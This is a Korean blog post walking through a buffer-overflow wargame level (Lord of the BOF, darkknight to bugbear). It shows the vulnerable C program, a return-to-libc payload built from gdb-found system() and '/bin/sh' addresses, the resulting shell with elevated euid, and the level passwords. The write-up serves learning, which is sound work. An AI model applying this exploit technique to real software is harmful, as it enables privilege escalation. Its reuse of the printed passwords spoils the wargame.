---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL13 (Darkknight -> Bugbear) : RTL1"
date: 2015-11-27 22:03:10
category: wargame
tags:  bof 
---

- id = darkknight
- pw = new attacker

<!--more--> 

## 1. 문제 : bugbear.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - bugbear
        - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack betrayed you!!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

## 2. 공격 준비

### 2.1 공격 방법 고민

이전 LEVEL9 (Troll -> Vampire) : Check 0xbfff에서는 0xbfff 가 아니라 0xbffe 가 되도록 command line argument 를 이용하였으나 이번 문제는 0xbe가 되도록 하기에는 너무 멀다. 따라서 shellcode 를 stack 에 올려놓고 실행을 하는 것이 아니라 Return to libc 기법을 이용하여 새로운 shellcode 가 아니라 system 에 있는 기존 함수를 실행시킬 수 있도록 환경을 꾸며보자.

### 2.2 RTL 공격

최신 커널에서는 stack 에서 shellcode execution 이 되지 않도록 DEP 와 같은 방어가 되어 있는 경우에 주로 사용되는 공격 방법이라고 한다. 기존 shellcode 에서는 jump 한 후 실행된 코드를 직접 작성하였지만 RTL 에서는 기존의 system 함수를 실행시키게되므로 실행시킬 함수의 주소와 이를 위한 parameter setting 잘 맞추어주는 것이 핵심이다.

### 2.3 x86 function argument passing

ARM 경우에는 function parameter 를 네개까지는 r0, r1, r2, r3 로 register 를 통하여 입력 받게 되어 있고, 네 개가 넘어갈 경우에는 stack memory를 이용한다. 그렇다면 x86은 어떻게 할까 ? x86은 function parameter 를 register 가 아니라 stack 을 통하여 입력을 받는다.

[Arguments : A brief introduction to x86 calling conventions](http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html)

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage13-1.png)

## 2.4 공격

RTL 통하여 실행하고자 하는 명령어는 바로 shell launching system("/bin/sh")이다. 이를 위한 system 함수 호출 시의 stack은 다음과 같이 구성되어야 한다고 한다. ㅋㅋ

```
buffer[40] | SFP | LR | ...
=  buffer[44] | [system() 주소] | dummy[4] | [/bin/sh string]
```
### 2.4.1 system() 함수 주소 = 0x40058ae0

```
(gdb) print system
$2 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
```

### 2.4.2 /bin/sh string 주소 = 0x400fbff9

다른 문제 풀이를 보면 system library 에 포함되어 있는 /bin/sh string 주소를 얻어서 활용하고 있다. 나는 이 값을 내가 직접 환경변수에 설정하고, 이를 사용해보려고 하는데 계속 주소가 틀리는지 seg fault 가 난다. 아무래도 gdb 실행환경과 일반 실행 환경의 stack 이 조금 다르게 형성되는 것 같다. 일단 답 그대로 사용해본다. T_T;

## 3 Exploit

```bash
buffer[44] | [system() 주소] | dummy[4] | [/bin/sh string]

> ./bugbear `python -c 'print "A"*44 + "\xe0\x8a\x05\x40" * 2 + "\xf9\xbf\x0f\x40"'`    
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAà@à@ù¿@
bash$ id
uid=512(darkknight) gid=512(darkknight) euid=513(bugbear) egid=513(bugbear) groups=512(darkknight)
```

## 4. 다음 단계 정보

```bash
bash$ id
uid=512(darkknight) gid=512(darkknight) euid=513(bugbear) egid=513(bugbear) groups=512(darkknight)
bash$ my-pass
euid = 513
new divide
```



